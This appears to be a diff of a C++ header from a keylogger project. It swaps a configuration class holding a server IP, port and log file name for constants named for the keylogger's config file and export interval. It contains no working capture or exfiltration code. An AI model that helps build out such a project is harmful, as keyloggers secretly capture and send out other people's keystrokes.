@@ -1,23 +1,6 @@
 #pragma once
-#include <json/json.h>
-#include <string>
-#include <fstream>
-#include <iostream>
 
-#define DEFAULT_CONFIG_FILE "configuration.conf"
+/* This file contains d */
+#define KEYLOGGER_DEFAULT_CONFIG_FILE "configuration.conf"
+#define KEYLOGGER_FILE_EXPORT_INTERVAL 10
 
-using namespace std;
-class Configuration
-{
-	private:
-		int _srvport;
-		string _srvip;
-		string _lgfl_name;
-
-	public:
-		Configuration(string conf = DEFAULT_CONFIG_FILE);
-		~Configuration();
-		int get_srvport() const;
-		string get_srvip() const;
-		string get_lgfl_name() const;
-};
